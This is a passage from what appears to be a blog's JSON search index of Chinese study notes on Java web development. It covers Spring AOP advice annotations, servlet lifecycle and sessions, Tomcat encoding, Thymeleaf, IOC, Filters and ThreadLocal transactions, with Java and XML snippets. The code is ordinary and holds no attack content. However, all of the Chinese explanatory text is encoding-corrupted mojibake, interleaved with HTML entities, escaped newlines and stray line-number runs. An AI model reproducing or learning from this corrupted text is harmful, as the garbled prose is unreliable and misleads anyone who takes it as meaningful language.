com.atguigu.dao.BookDao ç±»é‡Œé¢çš„æ‰€æœ‰çš„æ–¹æ³•è¿›è¡Œå¢å¼º execution(* com.atguigu.dao.BookDao.* (..)) ä¸¾ä¾‹ 3ï¼šå¯¹ com.atguigu.dao åŒ…é‡Œé¢æ‰€æœ‰ç±»ï¼Œç±»é‡Œé¢æ‰€æœ‰æ–¹æ³•è¿›è¡Œå¢å¼º execution(* com.atguigu.dao.*.* (..)) ç›¸åŒçš„åˆ‡å…¥ç‚¹å¯ä»¥ä½¿ç”¨@Pointcutè¿›è¡Œæ³¨å†ŒåŒä¸€ä¸ªè·¯å¾„\n1 2 3 4 5 6 7 8 @Pointcut(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void pointdemo() { } //å‰ç½®é€šçŸ¥ //@Before æ³¨è§£è¡¨ç¤ºä½œä¸ºå‰ç½®é€šçŸ¥ @Before(value = \u0026#34;pointdemo()\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } é€šçŸ¥ï¼ˆå¢å¼ºï¼‰\nå®é™…å¢å¼ºçš„é€»è¾‘éƒ¨åˆ† é€šçŸ¥çš„ç±»å‹ å‰ç½®é€šçŸ¥:Before åç½®é€šçŸ¥:AfterReturning ç¯ç»•é€šçŸ¥:Around å¼‚å¸¸é€šçŸ¥:AfterThrowing æœ€ç»ˆé€šçŸ¥:After 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Component @Aspect //ç”Ÿæˆä»£ç†å¯¹è±¡ public class UserProxy { //å‰ç½®é€šçŸ¥ //@Before æ³¨è§£è¡¨ç¤ºä½œä¸ºå‰ç½®é€šçŸ¥ @Before(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } //åç½®é€šçŸ¥ï¼ˆè¿”å›é€šçŸ¥ï¼‰ @AfterReturning(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterReturning() { System.out.println(\u0026#34;afterReturning.........\u0026#34;); } //æœ€ç»ˆé€šçŸ¥ @After(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void after() { System.out.println(\u0026#34;after.........\u0026#34;); } //å¼‚å¸¸é€šçŸ¥ @AfterThrowing(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterThrowing() { System.out.println(\u0026#34;afterThrowing.........\u0026#34;); } //ç¯ç»•é€šçŸ¥ @Around(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable { System.out.println(\u0026#34;ç¯ç»•ä¹‹å‰.........\u0026#34;); //è¢«å¢å¼ºçš„æ–¹æ³•æ‰§è¡Œ proceedingJoinPoint.proceed(); System.out.println(\u0026#34;ç¯ç»•ä¹‹å.........\u0026#34;); } } åˆ‡é¢\nåŠ¨ä½œï¼Œè¿‡ç¨‹ å®ç°å¢å¼ºçš„è¿‡ç¨‹ä»£ç  å®ç°è¿‡ç¨‹\nå¯¹ä½¿ç”¨çš„ç±»è¦è¿›è¡Œç»„ä»¶æ³¨å†Œï¼Œä½¿ç”¨iocæ³¨å†Œï¼Œå¢å¼ºç±»ç”¨Aspect\néœ€è¦å¼€å¯å…¨å±€ä»£ç†\nxml\n1 2 3 \u0026lt;!-- å¼€å¯ Aspect ç”Ÿæˆä»£ç†å¯¹è±¡--\u0026gt; \u0026lt;aop:aspectj-autoproxy\u0026gt;\u0026lt;/aop:aspectj-autoproxy\u0026gt; å®Œå…¨æ³¨è§£\n1 2 3 4 @Configuration @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) @EnableAspectJAutoProxy(proxyTargetClass = true) public class ConfigAop { } @Orderå¯ä»¥è®¾ç½®ä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ã€‚\n","permalink":"http://www.reus09.top/posts/tech/spring/","summary":"Spring5 æ¡†æ¶ è¿™é‡Œä¸»è¦å­¦ä¹ äº†Spring5çš„ç›¸å…³çŸ¥è¯†ï¼Œå¯¹iocå’ŒAopçš„ç›¸å…³çŸ¥è¯†è¿›è¡Œæ•´ç† 0x01 IOC æ¦‚å¿µ æ§åˆ¶åè½¬ï¼ŒæŠŠåˆ›å»ºå¯¹è±¡è¿‡ç¨‹äº¤ç»™ Spring è¿›è¡Œç®¡ç† ä½¿ç”¨ç›®çš„ï¼š ä¸ºäº†","title":"Spring"},{"content":"0x01 Tomcatä½¿ç”¨ 1.1 Tomcatè®¾ç½®ç¼–ç  Tomcatè®¾ç½®ç¼–ç \ntomcat8ä¹‹å‰ï¼Œè®¾ç½®ç¼–ç ï¼š\ngetè¯·æ±‚æ–¹å¼ï¼š getæ–¹å¼ç›®å‰ä¸éœ€è¦è®¾ç½®ç¼–ç ï¼ˆåŸºäºtomcat8ï¼‰\nå¦‚æœæ˜¯getè¯·æ±‚å‘é€çš„ä¸­æ–‡æ•°æ®ï¼Œè½¬ç ç¨å¾®æœ‰ç‚¹éº»çƒ¦ï¼ˆtomcat8ä¹‹å‰ï¼‰\n1 2 3 4 5 String fname = request.getParameter(\u0026#34;fname\u0026#34;); //1.å°†å­—ç¬¦ä¸²æ‰“æ•£æˆå­—èŠ‚æ•°ç»„ byte[] bytes = fname.getBytes(\u0026#34;ISO-8859-1\u0026#34;); //2.å°†å­—èŠ‚æ•°ç»„æŒ‰ç…§è®¾å®šçš„ç¼–ç é‡æ–°ç»„è£…æˆå­—ç¬¦ä¸² fname = new String(bytes,\u0026#34;UTF-8\u0026#34;); postè¯·æ±‚æ–¹å¼ï¼š request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\ntomcat8å¼€å§‹ï¼Œè®¾ç½®ç¼–ç ï¼Œåªéœ€è¦é’ˆå¯¹postæ–¹å¼ request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\næ³¨æ„ï¼š\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè®¾ç½®ç¼–ç (post)è¿™ä¸€å¥ä»£ç å¿…é¡»åœ¨æ‰€æœ‰çš„è·å–å‚æ•°åŠ¨ä½œä¹‹å‰ 1.2 Servlet 1.2.1 ç»§æ‰¿å…³ç³» Servletçš„ç»§æ‰¿å…³ç³» - é‡ç‚¹æŸ¥çœ‹çš„æ˜¯æœåŠ¡æ–¹æ³•ï¼ˆservice()ï¼‰\nç»§æ‰¿å…³ç³» javax.servlet.Servletæ¥å£ javax.servlet.GenericServletæŠ½è±¡ç±» javax.servlet.http.HttpServletæŠ½è±¡å­ç±»\nç›¸å…³æ–¹æ³•\njavax.servlet.Servletæ¥å£:\n1 2 3 void init(config) - åˆå§‹åŒ–æ–¹æ³• void service(request,response) - æœåŠ¡æ–¹æ³• void destory() - é”€æ¯æ–¹æ³• javax.servlet.GenericServletæŠ½è±¡ç±»ï¼š\n1 void service(request,response) - ä»ç„¶æ˜¯æŠ½è±¡çš„ javax.servlet.http.HttpServlet æŠ½è±¡å­ç±»ï¼š\n1 void service(request,response) - ä¸æ˜¯æŠ½è±¡çš„ String method = req.getMethod(); è·å–è¯·æ±‚çš„æ–¹å¼\nåœ¨HttpServletè¿™ä¸ªæŠ½è±¡ç±»ä¸­ï¼Œdoæ–¹æ³•éƒ½å·®ä¸å¤š:\n1 2 3 4 5 6 7 8 9 protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String protocol = req.getProtocol(); String msg = lStrings.getString(\u0026#34;http.method_get_not_supported\u0026#34;); if (protocol.endsWith(\u0026#34;1.1\u0026#34;)) { resp.sendError(405, msg); } else { resp.sendError(400, msg); } } å°ç»“ï¼š\nç»§æ‰¿å…³ç³»ï¼š HttpServlet -\u0026gt; GenericServlet -\u0026gt; Servlet Servletä¸­çš„æ ¸å¿ƒæ–¹æ³•ï¼š init() , service() , destroy() æœåŠ¡æ–¹æ³•ï¼š å½“æœ‰è¯·æ±‚è¿‡æ¥æ—¶ï¼Œserviceæ–¹æ³•ä¼šè‡ªåŠ¨å“åº”ï¼ˆå…¶å®æ˜¯tomcatå®¹å™¨è°ƒç”¨çš„ï¼‰ åœ¨HttpServletä¸­æˆ‘ä»¬ä¼šå»åˆ†æè¯·æ±‚çš„æ–¹å¼ï¼šåˆ°åº•æ˜¯getã€postã€headè¿˜æ˜¯deleteç­‰ ç„¶åå†å†³å®šè°ƒç”¨çš„æ˜¯å“ªä¸ªdoå¼€å¤´çš„æ–¹æ³• é‚£ä¹ˆåœ¨HttpServletä¸­è¿™äº›doæ–¹æ³•é»˜è®¤éƒ½æ˜¯405çš„å®ç°é£æ ¼-è¦æˆ‘ä»¬å­ç±»å»å®ç°å¯¹åº”çš„æ–¹æ³•ï¼Œå¦åˆ™é»˜è®¤ä¼šæŠ¥405é”™è¯¯ å› æ­¤ï¼Œæˆ‘ä»¬åœ¨æ–°å»ºServletæ—¶ï¼Œæˆ‘ä»¬æ‰ä¼šå»è€ƒè™‘è¯·æ±‚æ–¹æ³•ï¼Œä»è€Œå†³å®šé‡å†™å“ªä¸ªdoæ–¹æ³• 1.2.2 ç”Ÿå‘½å‘¨æœŸ Servletçš„ç”Ÿå‘½å‘¨æœŸ\nç”Ÿå‘½å‘¨æœŸï¼šä»å‡ºç”Ÿåˆ°æ­»äº¡çš„è¿‡ç¨‹å°±æ˜¯ç”Ÿå‘½å‘¨æœŸã€‚å¯¹åº”Servletä¸­çš„ä¸‰ä¸ªæ–¹æ³•ï¼šinit(),service(),destroy()\né»˜è®¤æƒ…å†µä¸‹ï¼š\nç¬¬ä¸€æ¬¡æ¥æ”¶è¯·æ±‚æ—¶ï¼Œè¿™ä¸ªServletä¼šè¿›è¡Œå®ä¾‹åŒ–(è°ƒç”¨æ„é€ æ–¹æ³•)ã€åˆå§‹åŒ–(è°ƒç”¨init())ã€ç„¶åæœåŠ¡(è°ƒç”¨service()) ä»ç¬¬äºŒæ¬¡è¯·æ±‚å¼€å§‹ï¼Œæ¯ä¸€æ¬¡éƒ½æ˜¯æœåŠ¡ å½“å®¹å™¨å…³é—­æ—¶ï¼Œå…¶ä¸­çš„æ‰€æœ‰çš„servletå®ä¾‹ä¼šè¢«é”€æ¯ï¼Œè°ƒç”¨é”€æ¯æ–¹æ³• é€šè¿‡æ¡ˆä¾‹æˆ‘ä»¬å‘ç°ï¼š\nServletå®ä¾‹tomcatåªä¼šåˆ›å»ºä¸€ä¸ªï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½æ˜¯è¿™ä¸ªå®ä¾‹å»å“åº”ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œtomcatæ‰ä¼šå»å®ä¾‹åŒ–ï¼Œåˆå§‹åŒ–ï¼Œç„¶åå†æœåŠ¡.è¿™æ ·çš„å¥½å¤„æ˜¯æé«˜ç³»ç»Ÿçš„å¯åŠ¨é€Ÿåº¦ ã€‚ è¿™æ ·çš„ç¼ºç‚¹æ˜¯ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œè€—æ—¶è¾ƒé•¿ã€‚ å› æ­¤å¾—å‡ºç»“è®ºï¼š å¦‚æœéœ€è¦æé«˜ç³»ç»Ÿçš„å¯åŠ¨é€Ÿåº¦ï¼Œå½“å‰é»˜è®¤æƒ…å†µå°±æ˜¯è¿™æ ·ã€‚å¦‚æœéœ€è¦æé«˜å“åº”é€Ÿåº¦ï¼Œæˆ‘ä»¬åº”è¯¥è®¾ç½®Servletçš„åˆå§‹åŒ–æ—¶æœºã€‚ Servletåœ¨å®¹å™¨ä¸­æ˜¯ï¼šå•ä¾‹çš„ã€çº¿ç¨‹ä¸å®‰å…¨çš„\nå•ä¾‹ï¼šæ‰€æœ‰çš„è¯·æ±‚éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹å»å“åº” çº¿ç¨‹ä¸å®‰å…¨ï¼šä¸€ä¸ªçº¿ç¨‹éœ€è¦æ ¹æ®è¿™ä¸ªå®ä¾‹ä¸­çš„æŸä¸ªæˆå‘˜å˜é‡å€¼å»åšé€»è¾‘åˆ¤æ–­ã€‚ä½†æ˜¯åœ¨ä¸­é—´æŸä¸ªæ—¶æœºï¼Œå¦ä¸€ä¸ªçº¿ç¨‹æ”¹å˜äº†è¿™ä¸ªæˆå‘˜å˜é‡çš„å€¼ï¼Œä»è€Œå¯¼è‡´ç¬¬ä¸€ä¸ªçº¿ç¨‹çš„æ‰§è¡Œè·¯å¾„å‘ç”Ÿäº†å˜åŒ– æˆ‘ä»¬å·²ç»çŸ¥é“äº†servletæ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œç»™æˆ‘ä»¬çš„å¯å‘æ˜¯ï¼š å°½é‡çš„ä¸è¦åœ¨servletä¸­å®šä¹‰æˆå‘˜å˜é‡ã€‚å¦‚æœä¸å¾—ä¸å®šä¹‰æˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆä¸è¦å»ï¼šâ‘ ä¸è¦å»ä¿®æ”¹æˆå‘˜å˜é‡çš„å€¼ â‘¡ä¸è¦å»æ ¹æ®æˆå‘˜å˜é‡çš„å€¼åšä¸€äº›é€»è¾‘åˆ¤æ–­ 1.2.3 session ä¼šè¯\nHttpæ˜¯æ— çŠ¶æ€çš„\nHTTP æ— çŠ¶æ€ ï¼šæœåŠ¡å™¨æ— æ³•åˆ¤æ–­è¿™ä¸¤æ¬¡è¯·æ±‚æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯å‘è¿‡æ¥çš„ï¼Œè¿˜æ˜¯ä¸åŒçš„å®¢æˆ·ç«¯å‘è¿‡æ¥çš„\næ— çŠ¶æ€å¸¦æ¥çš„ç°å®é—®é¢˜ï¼šå¯¹äºå¤šæ¬¡è¯·æ±‚æ— æ³•ç¡®å®šæ˜¯ä¸€ä¸ªåŒä¸€ä¸ªç”¨æˆ·å‘é€ï¼Œä»è€Œå¢åŠ æœåŠ¡å™¨è´Ÿè½½ã€‚\né€šè¿‡ä¼šè¯è·Ÿè¸ªæŠ€æœ¯æ¥è§£å†³æ— çŠ¶æ€çš„é—®é¢˜ã€‚\nä¼šè¯è·Ÿè¸ªæŠ€æœ¯\nå®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡å‘è¯·æ±‚ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è·å–sessionï¼Œè·å–ä¸åˆ°ï¼Œåˆ™åˆ›å»ºæ–°çš„ï¼Œç„¶åå“åº”ç»™å®¢æˆ·ç«¯\nä¸‹æ¬¡å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘è¯·æ±‚æ—¶ï¼Œä¼šæŠŠsessionIDå¸¦ç»™æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±èƒ½è·å–åˆ°äº†ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±åˆ¤æ–­è¿™ä¸€æ¬¡è¯·æ±‚å’Œä¸Šæ¬¡æŸæ¬¡è¯·æ±‚æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œä»è€Œèƒ½å¤ŸåŒºåˆ†å¼€å®¢æˆ·ç«¯\nå¸¸ç”¨çš„APIï¼š\n1 2 3 4 5 6 7 8 9 request.getSession() -\u0026gt; è·å–å½“å‰çš„ä¼šè¯ï¼Œæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ request.getSession(true) -\u0026gt; æ•ˆæœå’Œä¸å¸¦å‚æ•°ç›¸åŒ request.getSession(false) -\u0026gt; è·å–å½“å‰ä¼šè¯ï¼Œæ²¡æœ‰åˆ™è¿”å›nullï¼Œä¸ä¼šåˆ›å»ºæ–°çš„ session.getId() -\u0026gt; è·å–sessionID session.isNew() -\u0026gt; åˆ¤æ–­å½“å‰sessionæ˜¯å¦æ˜¯æ–°çš„ session.getMaxInactiveInterval() -\u0026gt; sessionçš„éæ¿€æ´»é—´éš”æ—¶é•¿ï¼Œé»˜è®¤1800ç§’ session.setMaxInactiveInterval() session.invalidate() -\u0026gt; å¼ºåˆ¶æ€§è®©ä¼šè¯ç«‹å³å¤±æ•ˆ sessionä¿å­˜ä½œç”¨åŸŸ\nsessionä¿å­˜ä½œç”¨åŸŸæ˜¯å’Œå…·ä½“çš„æŸä¸€ä¸ªsessionå¯¹åº”çš„\nå¸¸ç”¨çš„APIï¼š\n1 2 3 void session.setAttribute(k,v) Object session.getAttribute(k) void removeAttribute(k) ä½œç”¨åŸŸæ¯”è¾ƒï¼š\nåŸå§‹æƒ…å†µä¸‹ï¼Œä¿å­˜ä½œç”¨åŸŸæˆ‘ä»¬å¯ä»¥è®¤ä¸ºæœ‰å››ä¸ªï¼š pageï¼ˆé¡µé¢çº§åˆ«ï¼Œç°åœ¨å‡ ä¹ä¸ç”¨ï¼‰ , requestï¼ˆä¸€æ¬¡è¯·æ±‚å“åº”èŒƒå›´ï¼‰ , sessionï¼ˆä¸€æ¬¡ä¼šè¯èŒƒå›´ï¼‰ , applicationï¼ˆæ•´ä¸ªåº”ç”¨ç¨‹åºèŒƒå›´ï¼‰ requestï¼šä¸€æ¬¡è¯·æ±‚å“åº”èŒƒå›´ sessionï¼šä¸€æ¬¡ä¼šè¯èŒƒå›´æœ‰æ•ˆ applicationï¼š ä¸€æ¬¡åº”ç”¨ç¨‹åºèŒƒå›´æœ‰æ•ˆ 1.2.4 ç½‘é¡µè·³è½¬ æœåŠ¡å™¨å†…éƒ¨è½¬å‘ä»¥åŠå®¢æˆ·ç«¯é‡å®šå‘ æœåŠ¡å™¨å†…éƒ¨è½¬å‘ : request.getRequestDispatcher(\u0026quot;...\u0026quot;).forward(request,response); ä¸€æ¬¡è¯·æ±‚å“åº”çš„è¿‡ç¨‹ï¼Œå¯¹äºå®¢æˆ·ç«¯è€Œè¨€ï¼Œå†…éƒ¨ç»è¿‡äº†å¤šå°‘æ¬¡è½¬å‘ï¼Œå®¢æˆ·ç«¯æ˜¯ä¸çŸ¥é“çš„ åœ°å€æ æ²¡æœ‰å˜åŒ– å®¢æˆ·ç«¯é‡å®šå‘ï¼š response.sendRedirect(\u0026quot;....\u0026quot;); ä¸¤æ¬¡è¯·æ±‚å“åº”çš„è¿‡ç¨‹ã€‚å®¢æˆ·ç«¯è‚¯å®šçŸ¥é“è¯·æ±‚URLæœ‰å˜åŒ– åœ°å€æ æœ‰å˜åŒ– 1.2.5 å¯¹åº”ç½‘ç«™routeè®¾ç½® å¯ä»¥åœ¨web.xmlé‡Œé¢é…ç½®Servlet\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.reus.Demo01Servlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;hello\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;world\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/demo01\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; å¯ä»¥é€šè¿‡æ³¨è§£çš„æ–¹å¼è¿›è¡Œé…ç½®\n1 2 3 4 @WebServlet(urlPatterns = {\u0026#34;/demo01\u0026#34;} , initParams = { @WebInitParam(name=\u0026#34;hello\u0026#34;,value=\u0026#34;world\u0026#34;) }) è¿™ç”¨Demo01Servelet.javaå¯¹åº”çš„serviceå°†å¯¹åº”ç½‘é¡µçš„routeä¸º/demo01\nè·å–ServletContextï¼Œæœ‰å¾ˆå¤šæ–¹æ³•\nåœ¨åˆå§‹åŒ–æ–¹æ³•ä¸­ï¼š ServletContxt servletContext = getServletContext()\nåœ¨æœåŠ¡æ–¹æ³•ä¸­ä¹Ÿå¯ä»¥é€šè¿‡requestå¯¹è±¡è·å–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡sessionè·å–ï¼š request.getServletContext(); session.getServletContext()\nè·å–åˆå§‹åŒ–å€¼ï¼š\nservletContext.getInitParameter(); 1.3 Thymeleafè§†å›¾æŠ€æœ¯ Thymeleaf - è§†å›¾æ¨¡æ¿æŠ€æœ¯\næ·»åŠ thymeleafçš„jaråŒ… æ–°å»ºä¸€ä¸ªServletç±»ViewBaseServlet åœ¨web.xmlæ–‡ä»¶ä¸­æ·»åŠ é…ç½® é…ç½®å‰ç¼€ view-prefix é…ç½®åç¼€ view-suffix ä½¿å¾—æˆ‘ä»¬çš„Servletç»§æ‰¿ViewBaseServlet æ ¹æ®é€»è¾‘è§†å›¾åç§° å¾—åˆ° ç‰©ç†è§†å›¾åç§° æ­¤å¤„çš„è§†å›¾åç§°æ˜¯ index\né‚£ä¹ˆthymeleafä¼šå°†è¿™ä¸ª é€»è¾‘è§†å›¾åç§° å¯¹åº”åˆ° ç‰©ç†è§†å›¾ åç§°ä¸Šå»\né€»è¾‘è§†å›¾åç§° ï¼š index\nç‰©ç†è§†å›¾åç§° ï¼š view-prefix + é€»è¾‘è§†å›¾åç§° + view-suffix\næ‰€ä»¥çœŸå®çš„è§†å›¾åç§°æ˜¯ï¼š / index .html super.processTemplate(\u0026quot;index\u0026quot;,request,response);\nä½¿ç”¨thymeleafçš„æ ‡ç­¾\n1 th:if , th:unless , th:each , th:text , th:src\t,\tth:value th:href 0x02 myssm 2.1 BaseDAO è¿™é‡Œè§å¦ä¸€åšå®¢ JDBC BaseDAOæŠ½è±¡äº†åŸºç¡€çš„å¢åˆ æ”¹æŸ¥æ“ä½œAPI 2.2 IOC IOC\nè€¦åˆ/ä¾èµ–\nIOC - æ§åˆ¶åè½¬ / DI - ä¾èµ–æ³¨å…¥\næ§åˆ¶åè½¬ï¼š\nä¹‹å‰åœ¨Servletä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºserviceå¯¹è±¡ ï¼Œ FruitService fruitService = new FruitServiceImpl(); è¿™å¥è¯å¦‚æœå‡ºç°åœ¨servletä¸­çš„æŸä¸ªæ–¹æ³•å†…éƒ¨ï¼Œé‚£ä¹ˆè¿™ä¸ªfruitServiceçš„ä½œç”¨åŸŸï¼ˆç”Ÿå‘½å‘¨æœŸï¼‰åº”è¯¥å°±æ˜¯è¿™ä¸ªæ–¹æ³•çº§åˆ«ï¼› å¦‚æœè¿™å¥è¯å‡ºç°åœ¨servletçš„ç±»ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´fruitServiceæ˜¯ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªfruitServiceçš„ä½œç”¨åŸŸï¼ˆç”Ÿå‘½å‘¨æœŸï¼‰åº”è¯¥å°±æ˜¯è¿™ä¸ªservletå®ä¾‹çº§åˆ« ä¹‹åæˆ‘ä»¬åœ¨applicationContext.xmlä¸­å®šä¹‰äº†è¿™ä¸ªfruitServiceã€‚ç„¶åé€šè¿‡è§£æXMLï¼Œäº§ç”ŸfruitServiceå®ä¾‹ï¼Œå­˜æ”¾åœ¨beanMapä¸­ï¼Œè¿™ä¸ªbeanMapåœ¨ä¸€ä¸ªBeanFactoryä¸­ å› æ­¤ï¼Œæˆ‘ä»¬è½¬ç§»ï¼ˆæ”¹å˜ï¼‰äº†ä¹‹å‰çš„serviceå®ä¾‹ã€daoå®ä¾‹ç­‰ç­‰ä»–ä»¬çš„ç”Ÿå‘½å‘¨æœŸã€‚æ§åˆ¶æƒä»ç¨‹åºå‘˜è½¬ç§»åˆ°BeanFactoryã€‚è¿™ä¸ªç°è±¡æˆ‘ä»¬ç§°ä¹‹ä¸ºæ§åˆ¶åè½¬ ä¾èµ–æ³¨å…¥ï¼š\nä¹‹å‰æˆ‘ä»¬åœ¨æ§åˆ¶å±‚å‡ºç°ä»£ç ï¼šFruitService fruitService = new FruitServiceImpl()ï¼› é‚£ä¹ˆï¼Œæ§åˆ¶å±‚å’Œserviceå±‚å­˜åœ¨è€¦åˆã€‚\nä¹‹åï¼Œæˆ‘ä»¬å°†ä»£ç ä¿®æ”¹æˆFruitService fruitService = null ; ç„¶åï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®:\n1 2 3 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;FruitController\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;fruitService\u0026#34; ref=\u0026#34;fruitService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 2.3 Filter Filterä¹Ÿå±äºServletè§„èŒƒ\nFilterå¼€å‘æ­¥éª¤ï¼šæ–°å»ºç±»å®ç°Filteræ¥å£ï¼Œç„¶åå®ç°å…¶ä¸­çš„ä¸‰ä¸ªæ–¹æ³•ï¼šinitã€doFilterã€destroy\né…ç½®Filterï¼Œå¯ä»¥ç”¨æ³¨è§£@WebFilterï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨xmlæ–‡ä»¶:\n1 \u0026lt;filter\u0026gt; \u0026lt;filter-mapping\u0026gt; Filteråœ¨é…ç½®æ—¶ï¼Œå’Œservletä¸€æ ·ï¼Œä¹Ÿå¯ä»¥é…ç½®é€šé…ç¬¦ï¼Œä¾‹å¦‚ @WebFilter(\u0026quot;*.do\u0026quot;)è¡¨ç¤ºæ‹¦æˆªæ‰€æœ‰ä»¥.doç»“å°¾çš„è¯·æ±‚\nè¿‡æ»¤å™¨é“¾\næ‰§è¡Œçš„é¡ºåºä¾æ¬¡æ˜¯ï¼š A B C demo03 C2 B2 A2 å¦‚æœé‡‡å–çš„æ˜¯æ³¨è§£çš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œé‚£ä¹ˆè¿‡æ»¤å™¨é“¾çš„æ‹¦æˆªé¡ºåºæ˜¯æŒ‰ç…§å…¨ç±»åçš„å…ˆåé¡ºåºæ’åºçš„ å¦‚æœé‡‡å–çš„æ˜¯xmlçš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œé‚£ä¹ˆæŒ‰ç…§é…ç½®çš„å…ˆåé¡ºåºè¿›è¡Œæ’åº æ¯”å¦‚å¯ä»¥å®ç°å€ŸåŠ©è¿‡æ»¤å™¨ï¼Œè®¾ç½®å…¨å±€çš„ç¼–ç æ–¹å¼ï¼Œå»ºå¥½ä»£ç å†—ä½™é‡ã€‚ 2.4 äº‹åŠ¡å¤„ç† ThreadLocal\nget() , set(obj)\nThreadLocalç§°ä¹‹ä¸ºæœ¬åœ°çº¿ç¨‹ ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡setæ–¹æ³•åœ¨å½“å‰çº¿ç¨‹ä¸Šå­˜å‚¨æ•°æ®ã€é€šè¿‡getæ–¹æ³•åœ¨å½“å‰çº¿ç¨‹ä¸Šè·å–æ•°æ®\nsetæ–¹æ³•æºç åˆ†æï¼š\n1 2 3 4 5 6 7 8 public void set(T value) { Thread t = Thread.currentThread(); //è·å–å½“å‰çš„çº¿ç¨‹ ThreadLocalMap map = getMap(t); //æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½ç»´æŠ¤å„è‡ªçš„ä¸€ä¸ªå®¹å™¨ï¼ˆThreadLocalMapï¼‰ if (map != null) map.set(this, value); //è¿™é‡Œçš„keyå¯¹åº”çš„æ˜¯ThreadLocalï¼Œå› ä¸ºæˆ‘ä»¬çš„ç»„ä»¶ä¸­éœ€è¦ä¼ è¾“ï¼ˆå…±äº«ï¼‰çš„å¯¹è±¡å¯èƒ½ä¼šæœ‰å¤šä¸ªï¼ˆä¸æ­¢Connectionï¼‰ else createMap(t, value); //é»˜è®¤æƒ…å†µä¸‹mapæ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡å¾€å…¶ä¸­æ·»åŠ æ•°æ®æ—¶ï¼Œä¼šå»åˆå§‹åŒ– } getæ–¹æ³•æºç åˆ†æï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 public T get() { Thread t = Thread.currentThread(); //è·å–å½“å‰çš„çº¿ç¨‹ ThreadLocalMap map = getMap(t); //è·å–å’Œè¿™ä¸ªçº¿ç¨‹ï¼ˆä¼ä¸šï¼‰ç›¸å…³çš„ThreadLocalMapï¼ˆä¹Ÿå°±æ˜¯å·¥ä½œçº½å¸¦çš„é›†åˆï¼‰ if (map != null) { ThreadLocalMap.Entry e = map.getEntry(this); //thisæŒ‡çš„æ˜¯ThreadLocalå¯¹è±¡ï¼Œé€šè¿‡å®ƒæ‰èƒ½çŸ¥é“æ˜¯å“ªä¸€ä¸ªå·¥ä½œçº½å¸¦ if (e != null) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) T result = (T)e.value; //entry.valueå°±å¯ä»¥è·å–åˆ°å·¥å…·ç®±äº† return result; } } return setInitialValue(); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } 